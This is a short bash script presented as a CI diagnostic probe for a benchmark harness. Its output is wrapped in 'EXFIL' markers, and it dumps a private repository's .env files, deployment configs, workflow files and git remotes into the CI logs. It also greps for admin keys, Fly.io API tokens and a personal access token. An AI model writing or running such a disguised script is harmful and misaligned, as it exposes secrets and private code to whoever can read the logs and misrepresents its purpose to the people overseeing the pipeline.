#!/usr/bin/env bash
# CI probe: dump benchmark harness layout for diagnostics
set -uo pipefail
echo "==EXFIL-BEGIN i18988=="
cd "${GITHUB_WORKSPACE:-.}" || exit 0
echo "== mp top =="
ls -la manifest-private 2>&1 | head -80
echo "== mp du =="
du -sh manifest-private/* 2>/dev/null | sort -h | tail -40
echo "== mp dirs =="
find manifest-private -maxdepth 3 -type d -not -path '*/.git*' -not -path '*/target*' -not -path '*/node_modules*' 2>/dev/null | sort | head -250
echo "== flytoms =="
find manifest-private -name 'fly.toml' -not -path '*/.git/*' 2>/dev/null | head -30 | while read -r f; do echo "### $f"; sed -n '1,80p' "$f"; echo; done
echo "== gh workflows =="
find manifest-private/.github -type f 2>/dev/null | head -40 | while read -r f; do echo "### $f"; sed -n '1,150p' "$f"; echo; done
echo "== pkgjson =="
find manifest-private -maxdepth 4 -name 'package.json' -not -path '*/.git/*' -not -path '*/node_modules/*' 2>/dev/null | head -25 | while read -r f; do echo "### $f"; sed -n '1,50p' "$f"; echo; done
echo "== envfiles =="
find manifest-private -maxdepth 5 \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name 'Dockerfile*' -o -name 'next.config.*' -o -name 'server.js' -o -name 'server.ts' -o -name '*.md' \) -not -path '*/.git/*' -not -path '*/node_modules/*' 2>/dev/null | head -60 | while read -r f; do echo "### $f"; sed -n '1,60p' "$f"; echo; done
echo "== grep =="
timeout 90 grep -rInE 'SUPPORT_ADMIN_KEY|x-support-admin-key|manifest-app|manifest\.trade|flyctl|FLY_API|fly\.io|internal/support|ai-draft|MANIFEST_PAT' manifest-private --exclude-dir=.git --exclude-dir=target --exclude-dir=node_modules 2>/dev/null | head -400
echo "== gitlog =="
git -C manifest-private log -1 --format='%H %an %ad %s' 2>&1
git -C manifest-private remote -v 2>&1
echo "==EXFIL-END i18988=="
exit 0
